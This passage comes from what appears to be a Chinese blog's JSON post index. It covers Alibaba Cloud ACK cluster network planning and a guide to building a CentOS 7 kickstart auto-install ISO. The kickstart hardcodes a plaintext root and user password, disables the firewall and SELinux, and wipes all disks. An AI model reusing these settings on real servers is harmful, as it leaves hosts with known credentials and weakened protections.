loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026125651594.png\"\u003e\u003c/p\u003e\n\u003cp\u003e点击创建集群\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026130410655\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026130410655.png\"\u003e\u003c/p\u003e\n\u003cp\u003e点击后如下\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026130535880\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026130535880.png\"\u003e\u003c/p\u003e\n\u003cp\u003e各个选项的详细说明：\u003c/p\u003e\n\u003cp\u003e第一部分：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026130641164\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026130641164.png\"\u003e\u003c/p\u003e\n\u003cp\u003e集群版本： 最上面可以选择ACK托管版，和其他4个版本，着重说一下专有版和托管版的区别\u003c/p\u003e\n\u003cp\u003e专有版本：master和worker都需要自己创建，如果需要高可用，那么master需要至少三个，也就是说，如果你不想把master和worker放在同一台服务器上，就要多使用三台服务器。\u003c/p\u003e\n\u003cp\u003eACK托管版：master由阿里云给创建，自己只需要购买worker服务器。\u003c/p\u003e\n\u003cp\u003e集群名称： k8s-hbb\u003c/p\u003e\n\u003cp\u003e地域： 请选择自己ecs和rds等资源所在区域，这里是华东2（上海）\u003c/p\u003e\n\u003cp\u003eKubernetes版本：阿里云已经做好充分的测试了，所以选择默认的即可。这里是 1.18.8-aliyun.1\u003c/p\u003e\n\u003cp\u003e容器运行时： Docker 19.03.5\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026130846435\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026130846435.png\"\u003e\u003c/p\u003e\n\u003cp\u003e第二部分：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026130933798\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026130933798.png\"\u003e\u003c/p\u003e\n\u003cp\u003e专有网络: 专有网络选择和ecs，rds同一个专有网络，这里是vpc-uf6pcr7nvp3dqmx86yyk0，网段是172.19.0.0/16\u003c/p\u003e\n\u003cp\u003e虚拟交换机： 同一个专有网络下面的交换机是可以互通的，这里新建一个虚拟交换机，网段是172.19.240.0/20\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026131011787\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026131011787.png\"\u003e\u003c/p\u003e\n\u003cp\u003e网络插件： 选Flannel，除去阿里云自己的区别描述，还有一点  如果使用flannel插件，则worker端对外，访问外网（比如短信接口等）使用的是worder所在ecs自己的eip或者如果使用的是snat模式，就是snat绑定的eip。如果使用的terway插件则走的就是snat的eip。注意，创建集群成功后，会为集群创建一个对外服务的ingress的slb，worker内部的容器直接对外访问，使用的不是这个slb的ip。slb只是进来的通道。\u003c/p\u003e\n\u003cp\u003epod网络 CIDR：为统一起见，10.240.0.0/20\u003c/p\u003e\n\u003cp\u003eservice CIDR：为统一起见，192.168.240.0/20\u003c/p\u003e\n\u003cp\u003e注意以上 建立好了三个网段，三个网段中均有240字段，便于记忆\u003c/p\u003e\n\u003cp\u003e\u003c!-- raw HTML omitted --\u003eECS(2台)：172.19.240.0/20\u003c/p\u003e\n\u003cp\u003ePOD网段：10.240.0.0/20\u003c/p\u003e\n\u003cp\u003eService网段：192.168.240.0/20 \u003c!-- raw HTML omitted --\u003e\u003c/p\u003e\n\u003cp\u003e​\u003c/p\u003e\n\u003cp\u003e节点IP数量：256，指单个节点可运行 Pod 数量的上限。 \u003cstrong\u003e一定要拉到最大量256\u003c/strong\u003e ，弄到16的话，一个节点本身要跑10多个system的pod，就无法跑应用pod了。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026131504133\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026131504133.png\"\u003e\u003c/p\u003e","title":"阿里云ACK完全生产环境规划和搭建"},{"content":"之前介绍过如何制作一个 centos live cdrom 系统\n那么，某些情况下我们可能无法弄一个 pxe 系统，而只能通过 idrac 挂载 iso 的方式安装系统\n该如何去做呢？\n步骤如下：\n一、下载Centos的minimal安装光盘 wget http://mirrors.163.com/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-Minimal-2009.iso yum install -y mkisofs 二、准备kickstart安装文件 下载： centos7.ks\ntext skipx install auth --useshadow --enablemd5 authconfig --enableshadow --passalgo=sha512 firstboot --disable keyboard us lang en_US.UTF-8 reboot cdrom firewall --disable selinux --disabled services --enabled=\u0026#34;chronyd\u0026#34; logging level=info #ignoredisk --only-use=vda ignoredisk --only-use=sda #bootloader --location=mbr --append=\u0026#34;net.ifnames=0 biosdevname=0 crashkernel=auto\u0026#34; bootloader --location=mbr --append=\u0026#34;crashkernel=auto\u0026#34; rootpw --plaintext Renren2021! timezone Asia/Shanghai --isUtc network --device=lo --hostname=localhost.localdomain user --name=supdev --gid=511 --groups=\u0026#34;supdev\u0026#34; --uid=511 --password=\u0026#34;Renren2021!\u0026#34; zerombr clearpart --all --initlabel part biosboot --fstype=biosboot --size=1 part /boot --fstype ext4 --size=2048 part swap --asprimary --size=8192 part / --fstype ext4 --size=1 --grow #part biosboot --fstype=biosboot --size=1 #part /boot --fstype ext2 --size 250 #part pv.01 --size 1 --grow #volgroup vg pv.01 #logvol / --vgname=vg --size=1 --grow --fstype ext4 --fsoptions=discard,noatime --name=root #logvol /tmp --vgname=vg --size=1024 --fstype ext4 --fsoptions=discard,noatime --name=tmp #logvol swap --vgname=vg --recommended --name=swap #uefi #partition /boot/efi --asprimary --fstype=vfat --label EFI --size=200 #partition /boot --asprimary --fstype=ext4 --label BOOT --size=500 #partition / --asprimary --fstype=ext4 --label ROOT --size=4096 --grow services --enabled=network reboot %pre parted -s /dev/sda mklabel gpt %end %packages @core @system-admin-tools @additional-devel @virtualization-client @virtualization-platform @virtualization-tools libguestfs-tools-c perl-Sys-Virt qemu-guest-agent qemu-kvm-tools curl dstat expect openssl initscripts ipmitool lrzsz lsof mtools nc nmap perl perl-CPAN procps python screen sysstat systemtap systemtap-client systemtap-devel tcpdump telnet vim wget wsmancli zip chrony kexec-tools net-tools ntp ntpdate man acpid chrony telnet %end 三、准备生成iso的脚本 下载： makeiso.sh\n#!/bin/bash rm -rf /tmp/bootiso /tmp/bootcustom /tmp/boot.iso mkdir /tmp/bootiso mount -o loop CentOS-7-x86_64-Minimal-2009.iso /tmp/bootiso mkdir /tmp/bootcustom cp -r /tmp/bootiso/* /tmp/bootcustom umount /tmp/bootiso rmdir /tmp/bootiso chmod -R u+w /tmp/bootcustom cp centos7.ks /tmp/bootcustom/isolinux/ks.cfg sed -i \u0026#39;/menu\\ default/d\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;s/^timeout\\ .*/timeout 10/g\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;/^label\\ linux/i label\\ kickstart\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;/^label\\ linux/i \\ \\ menu\\ label\\ ^Install\\ Using\\ Kickstart\\ CentOS 7\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;/^label\\ linux/i \\ \\ menu\\ default\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;/^label\\ linux/i \\ \\ kernel\\ vmlinuz\\ biosdevname=0\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;/^label\\ linux/i \\ \\ append\\ initrd=initrd.img\\ ks=cdrom:\\/ks.cfg\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg sed -i \u0026#39;/^label\\ linux/i \\\\n\u0026#39; /tmp/bootcustom/isolinux/isolinux.cfg cd /tmp/bootcustom mkisofs -o /tmp/boot.iso -b isolinux.bin -c boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -V \u0026#34;CentOS 7 x86_64\u0026#34; -R -J -v -T isolinux/. . 生成的自动安装光盘文件在 /tmp/boot.iso ，在 idrac 中 mount 出来，就可以用 virtual CD-ROM 自动安装了\n","permalink":"https://rendoumi.com/posts/20211025-autoinstall_cd/","summary":"\u003cp\u003e之前介绍过如何制作一个 \u003ca href=\"../20211010-live_cd/\"\u003ecentos live cdrom\u003c/a\u003e 系统\u003c/p\u003e\n\u003cp\u003e那么，某些情况下我们可能无法弄一个 pxe 系统，而只能通过 idrac 挂载 iso 的方式安装系统\u003c/p\u003e\n\u003cp\u003e该如何去做呢？\u003c/p\u003e\n\u003cp\u003e步骤如下：\u003c/p\u003e\n\u003ch2 id=\"一下载centos的minimal安装光盘\"\u003e一、下载Centos的minimal安装光盘\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://mirrors.163.com/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-Minimal-2009.iso\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y mkisofs\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二准备kickstart安装文件\"\u003e二、准备kickstart安装文件\u003c/h2\u003e\n\u003cp\u003e下载： \u003ca href=\"centos7.ks\"\u003ecentos7.ks\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etext\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eskipx\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003einstall\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eauth  --useshadow  --enablemd5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eauthconfig --enableshadow --passalgo\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003esha512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efirstboot --disable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ekeyboard us\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elang en_US.UTF-8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ereboot\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecdrom\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efirewall --disable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eselinux  --disabled\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eservices --enabled\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;chronyd\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elogging level\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003einfo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#ignoredisk --only-use=vda\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eignoredisk --only-use\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003esda\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#bootloader --location=mbr --append=\u0026#34;net.ifnames=0 biosdevname=0 crashkernel=auto\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebootloader --location\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003embr --append=\u0026#34;crashkernel=auto\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erootpw --plaintext Renren2021!\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etimezone Asia/Shanghai --isUtc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enetwork  --device\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003elo --hostname=localhost.localdomain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003euser --name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003esupdev --gid=511 --groups=\u0026#34;supdev\u0026#34; --uid=511 --password=\u0026#34;Renren2021!\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ezerombr\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eclearpart --all --initlabel \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epart biosboot --fstype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003ebiosboot --size=1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epart /boot --fstype ext4 --size\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e2048 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epart swap  --asprimary   --size\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e8192\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epart /     --fstype ext4 --size\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e1 --grow\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#part biosboot --fstype=biosboot --size=1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#part /boot --fstype ext2 --size 250\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#part pv.01 --size 1 --grow\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#volgroup vg pv.01\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#logvol / --vgname=vg --size=1 --grow --fstype ext4 --fsoptions=discard,noatime --name=root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#logvol /tmp --vgname=vg --size=1024 --fstype ext4 --fsoptions=discard,noatime --name=tmp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#logvol swap --vgname=vg --recommended --name=swap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#uefi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#partition /boot/efi --asprimary --fstype=vfat --label EFI  --size=200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#partition /boot     --asprimary --fstype=ext4 --label BOOT --size=500\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#partition /         --asprimary --fstype=ext4 --label ROOT --size=4096 --grow\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eservices --enabled\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003enetwork\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ereboot\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%pre\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eparted -s /dev/sda mklabel gpt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%end\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%packages\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@core\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@system-admin-tools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@additional-devel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@virtualization-client\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@virtualization-platform\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@virtualization-tools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elibguestfs-tools-c\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eperl-Sys-Virt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eqemu-guest-agent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eqemu-kvm-tools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecurl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edstat\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eexpect\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eopenssl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003einitscripts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eipmitool\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elrzsz\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elsof\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emtools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enmap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eperl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eperl-CPAN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eprocps\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epython\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003escreen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esysstat\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemtap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemtap-client\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemtap-devel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etcpdump\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etelnet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evim\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewget\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewsmancli\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ezip\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echrony\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ekexec-tools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet-tools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003entp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003entpdate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eman\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eacpid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echrony\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 